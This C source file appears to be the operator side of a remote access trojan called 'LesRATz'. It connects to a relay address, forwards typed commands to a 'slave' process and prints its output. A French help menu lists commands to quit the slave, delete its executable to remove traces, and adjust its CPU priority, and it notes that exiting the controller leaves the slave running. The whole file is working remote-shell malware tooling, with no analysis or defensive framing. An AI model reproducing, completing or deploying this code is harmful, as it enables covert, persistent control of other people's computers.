/***************************************************************************************/
/*       ,--,                                                                          */
/*    ,---.'|                                                                          */
/*    |   | :                        ,-.----.                  ___                     */
/*    :   : |                        \    /  \               ,--.'|_                   */
/*    |   ' :                        ;   :    \              |  | :,'        ,----,    */
/*    ;   ; '              .--.--.   |   | .\ :              :  : ' :      .'   .`|    */
/*    '   | |__   ,---.   /  /    '  .   : |: |   ,--.--.  .;__,'  /    .'   .'  .'    */
/*    |   | :.'| /     \ |  :  /`./  |   |  \ :  /       \ |  |   |   ,---, '   ./     */
/*    '   :    ;/    /  ||  :  ;_    |   : .  / .--.  .-. |:__,'| :   ;   | .'  /      */
/*    |   |  ./.    ' / | \  \    `. ;   | |  \  \__\/: . .  '  : |__ `---' /  ;--,    */
/*    ;   : ;  '   ;   /|  `----.   \|   | ;\  \ ," .--.; |  |  | '.'|  /  /  / .`|    */
/*    |   ,/   '   |  / | /  /`--'  /:   ' | \.'/  /  ,.  |  ;  :    ;./__;     .'     */
/*    '---'    |   :    |'--'.     / :   : :-' ;  :   .'   \ |  ,   / ;   |  .'        */
/*              \   \  /   `--'---'  |   |.'   |  ,     .-./  ---`-'  `---'            */
/*               `----'              `---'      `--`---'                               */
/***************************************************************************************/

#include "netshell.h"

static inline
void	eperror(const char* msg)
{
	perror(msg);
	exit(1);
}

void	connect_to_proxy(s_nshell* ratz)
{
	ratz->net.addri.sin_port = htons(PORT);
	ratz->net.addri.sin_family = AF_INET;
	if (inet_pton(AF_INET, ADDRESS, &ratz->net.addri.sin_addr) == -1)
		eperror("inet_pton");
	else
	{
		if ((ratz->net.in = socket(AF_INET, SOCK_STREAM, 0)) == -1)
			eperror("socket");
		else if ((ratz->net.out = socket(AF_INET, SOCK_STREAM, 0)) == -1)
			eperror("socket");
		else
			if (connect(ratz->net.in, (const s_sockaddr*)&ratz->net.addri, sizeof(ratz->net.addri)) == -1)
				eperror("connect");
	}
	fcntl(ratz->net.in, F_SETFL, ~O_NONBLOCK);
	fcntl(ratz->net.out, F_SETFL, ~O_NONBLOCK);
	if (send(ratz->net.in, "ai", 2, 0) <= 0)
		eperror("send");
	if (connect(ratz->net.out, (const s_sockaddr*)&ratz->net.addri, sizeof(ratz->net.addri)) == -1)
		eperror("connect");
	if (send(ratz->net.out, "ao", 2, 0) <= 0)
		eperror("send");
}

void	sig_handler(int signum)
{
	if (signum == SIGINT)
	{
		rl_on_new_line();
		rl_redisplay();
		write(STDOUT_FILENO, "\n", 1);
		write(STDOUT_FILENO, RATZ_PROMPT, strlen(RATZ_PROMPT));
	}
}

void	builtin_exit(s_nshell* ratz)
{
	printf("exit\n");
	write(ratz->net.in, "exit\n", 6);
	ratz->killed = true;
}

void	__help__(void)
{
	printf("\e[1m\e[34mHELP INFOs - LesRATz\e[0m\n\n");
	printf("\e[1m\e[32m__quit__\e[0m\n");
	printf("   Quitte le programme esclave en fermant les connexions et les processus associés.\n\n");

	printf("\e[1m\e[32m__delete__\e[0m\n");
	printf("   Supprime le fichier exécutable et quitte le programme esclave.\n\n");
	
	printf("\e[1m\e[32m__cpu__ {X}\e[0m\n");
	printf("   Affiche ou modifie la priorité CPU du processus.\n");
	printf("   \e[1mX\e[0m : Valeur entre \e[1m-20\e[0m (priorité max) et \e[1m19\e[0m (priorité min).\n");
	printf("   Ne peut pas augmenter la priorité si le processus esclave n'est pas route.\n");
	printf("   Ne rendra pas plus efficace les commandes demandées.\n");
	printf("   Sans argument, affiche la priorité actuelle.\n\n");

	printf("\e[1m\e[32mexit \e[0m\e[32mor\e[1m ^-D\e[0m\n");
	printf("   NE termine pas le processus esclave, mais termine uniquement le processus controleur (celui-ci).\n");
}

char	__cpu__(s_nshell ratz, char* prompt)
{
	int	value = atoi(&((char*)prompt)[strlen("__cpu__")]);

	if (strlen((char*)prompt) == strlen("__cpu__") || value == 0)
	{
		fcntl(ratz.net.out, F_SETFL, fcntl(ratz.net.out, F_GETFL) & ~O_NONBLOCK);
		recv(ratz.net.out, &value, sizeof(value), 0);
		fcntl(ratz.net.out, F_SETFL, fcntl(ratz.net.out, F_GETFL) | O_NONBLOCK);
		printf("CPU usage [-20, 19] : %d\n", value);
	}
	return (true);
}

char	netbuiltins(s_nshell ratz, char* prompt)
{
	if (!strncmp(ratz.buffer, "__cpu__", strlen("__cpu__")))
		__cpu__(ratz, ratz.buffer);
	else if (!strcmp(ratz.buffer, "__quit__") || !strcmp(ratz.buffer, "__delete__"))
	{
		close(ratz.net.in);
		close(ratz.net.out);
		free(prompt);
		exit(0);
	}
	return (false);
}

int	main(void)
{
	s_nshell	ratz;

	//signal(SIGINT, sig_handler);
	struct sigaction	sa;
	sa.sa_flags = 0;
	sigemptyset(&sa.sa_mask);
	sa.sa_handler = sig_handler;
	sigaction(SIGINT, &sa, NULL);
	memset(&ratz, 0, sizeof(s_nshell));
	connect_to_proxy(&ratz);
	//int a = 1;
	//if (ioctl(STDIN_FILENO, TIOCPKT, &a) == -1)
	//	eperror("ioctl1");
	fcntl(STDIN_FILENO, F_SETFL, fcntl(STDIN_FILENO, F_GETFL) | O_NONBLOCK);
	fcntl(ratz.net.out, F_SETFL, O_NONBLOCK);
	//recv auth errors
	while (ratz.killed == false)
	{
		ratz.buffer = readline(RATZ_PROMPT);
		if (!ratz.buffer)
			builtin_exit(&ratz);
		else if (ratz.buffer[0])
		{
			if (!strcmp(ratz.buffer, "exit"))
				builtin_exit(&ratz);
			else if (!strcmp(ratz.buffer, "__help__"))
				__help__();
			else if (strcmp(ratz.buffer, "\003"))
			{
				send(ratz.net.in, ratz.buffer, strlen(ratz.buffer), 0);
				if (netbuiltins(ratz, ratz.buffer) == false)
				{
					while (true)
					{
						ratz.len = recv(ratz.net.out, ratz.msg, DEBUG_SIZE_MAX, 0);
						if (ratz.len > 0)
						{
							if (strstr(ratz.msg, "\0033EONING\003"))
							{
								if (ratz.len > 10)	// 10 = strlen("\0033EONING\003")
									write(STDOUT_FILENO, ratz.msg, ratz.len - 10);
								break ;
							}
							else
								write(STDOUT_FILENO, ratz.msg, ratz.len);
						}
						memset(ratz.msg, 0, DEBUG_SIZE_MAX);
						ratz.len = read(STDIN_FILENO, ratz.msg, DEBUG_SIZE_MAX); // faire un readall jusqu'à '\n' ou ' \003'
						//printf("n : %d\nstdin : %s\n", ratz.len, ratz.msg);
						if (ratz.len > 0)
						{
							if (ratz.msg[ratz.len - 1] != '\003')
								ratz.msg[ratz.len - 1] = '\n';
							send(ratz.net.in, ratz.msg, ratz.len, 0);
						}
					}
				}
			}
		}
		free(ratz.buffer);
		ratz.buffer = NULL;
	}
	free(ratz.buffer);
	close(ratz.net.in);
	close(ratz.net.out);
	return (0);
}
